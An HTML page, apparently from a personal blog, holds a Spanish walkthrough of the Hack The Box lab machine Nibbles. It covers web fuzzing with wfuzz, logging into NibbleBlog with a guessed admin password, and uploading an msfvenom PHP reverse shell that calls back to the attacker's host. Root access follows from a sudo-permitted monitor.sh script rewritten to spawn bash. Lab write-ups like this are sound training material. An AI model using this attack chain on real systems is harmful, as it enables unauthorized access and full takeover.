@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Nibbles HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/nibbles/pasted-20251105014457.png" alt="Nibbles HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Nibbles</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>linux</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing web hasta identificar NibbleBlog</li>
+            <li><code>Explotación</code>: Acceso al CMS con credenciales y abuso del plugin My_Image para subir una shell</li>
+            <li><code>Escalada de Privilegios</code>: Sudoers permite ejecutar <code>monitor.sh</code> como root</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <div class="code-card">
+            <h3>Puertos</h3>
+            <pre><code>Port: 80 cms NibbleBlog 4.0.3</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Fuzzing web directorios y archivos php</h3>
+            <pre><code>wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://nibbles/FUZZ/
+wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://nibbles/FUZZ.php
+
+# Directorios /admin /plugins /content (Encontramos en ese directorio usuario admin)
+# Archivos /admin.php -&gt; Login</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: NibbleBlog 4.0.3 File Upload Plugin My_Image</h2>
+          <p>Login en la ruta<code>http://nibbles/nibbleblog/admin.php</code> como <code>admin:nibbles</code> (Por la cara tienes que suponer que esa era la contraseña)</p>
+          <p>Navegar a <code>Plugins</code> -&gt; <code>My_Image</code> -&gt; <code>Configure</code> -&gt; <code>Subir shell.php</code></p>
+          <div class="code-card">
+            <h3>shell.php</h3>
+            <pre><code>msfvenom -p php/reverse_php LHOST=&lt;kali_ip&gt; LPORT=443 -o shell.php</code></pre>
+          </div>
+          <p>En la ruta <code>http://nibbles/nibbleblog/content/private/plugins/my_image/</code> ejecutamos la reverse shell y nos ponemos en escucha</p>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Sudoers</h2>
+          <div class="code-card">
+            <h3>Cualquier usuario puede ejecutar monitor.sh como root</h3>
+            <pre><code>sudo -l
+#     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Creamos monitor.sh en su ruta y le insertamos un one liner</h3>
+            <pre><code>echo -e "#!/bin/bash\n/bin/bash" &gt; monitor.sh
+sudo ./monitor.sh</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>linux</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
